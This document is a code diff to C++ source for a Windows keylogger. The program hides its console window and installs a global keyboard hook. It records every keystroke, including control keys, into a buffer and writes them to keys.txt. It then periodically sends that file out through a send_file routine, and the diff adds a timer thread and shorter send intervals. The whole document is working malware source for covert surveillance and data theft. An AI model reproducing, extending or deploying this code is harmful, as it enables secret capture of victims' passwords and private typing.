@@ -1,15 +1,18 @@
 #define _WIN32_WINNT 0x0500
 #include <fstream>
-#include <windows.h>
-#include "LogSender.hpp"
-#include "FTP.hpp"
+
 #include "file_send.cpp"
 #include "timer.cpp"
 
+#include <windows.h>
+
 using namespace std;
 
+extern int counter;
+extern fd_set write_fds;
+
 string buffer = "";
-ofstream out("./keys.txt");
+ofstream out;
 
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -22,43 +25,43 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         {
         // Invisible keys
         case VK_CAPITAL:
-            out << "<CAPLOCK>";
+            buffer += "<CAPLOCK>";
             break;
         case VK_SHIFT:
-            out << "<SHIFT>";
+            buffer += "<SHIFT>";
             break;
         case VK_LCONTROL:
-            out << "<LCTRL>";
+            buffer += "<LCTRL>";
             break;
         case VK_RCONTROL:
-            out << "<RCTRL>";
+            buffer += "<RCTRL>";
             break;
         case VK_INSERT:
-            out << "<INSERT>";
+            buffer += "<INSERT>";
             break;
         case VK_END:
-            out << "<END>";
+            buffer += "<END>";
             break;
         case VK_PRINT:
-            out << "<PRINT>";
+            buffer += "<PRINT>";
             break;
         case VK_DELETE:
-            out << "<DEL>";
+            buffer += "<DEL>";
             break;
         case VK_BACK:
-            out << "<BK>";
+            buffer += "<BK>";
             break;
         case VK_LEFT:
-            out << "<LEFT>";
+            buffer += "<LEFT>";
             break;
         case VK_RIGHT:
-            out << "<RIGHT>";
+            buffer += "<RIGHT>";
             break;
         case VK_UP:
-            out << "<UP>";
+            buffer += "<UP>";
             break;
         case VK_DOWN:
-            out << "<DOWN>";
+            buffer += "<DOWN>";
             break;
         // Visible keys
         default:
@@ -66,21 +69,25 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         }
     }
 
-    if(mtx.try_lock()) {
-
-            if (counter % 180 == 0){
-                send_file("./keys.txt");
-            }
-
-            else if (counter % 60 == 0){
-                out << buffer;
-
-                buffer = "";
-            }
-           
-            mtx.unlock();
-            sleep(1);
+    if(mtx.lock()) {
+        if (counter % 18 == 0){
+            string filename = "";
+            send_file("./keys.txt");
         }
+
+        else if (counter % 6 == 0){
+            out.open("./keys.txt", ios::out);
+            out << buffer;
+
+            buffer = "";
+
+            out.close();
+        }
+       
+        mtx.unlock();
+
+        sleep(1);
+    }
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
@@ -92,6 +99,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
+
+    std::thread th(tick);
     
     // Set windows hook
     HHOOK keyboardHook = SetWindowsHookEx(
@@ -109,4 +118,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         /* Send message to WindowProcedure */
         DispatchMessage(&messages);
     }
+
+    return 0;
 }
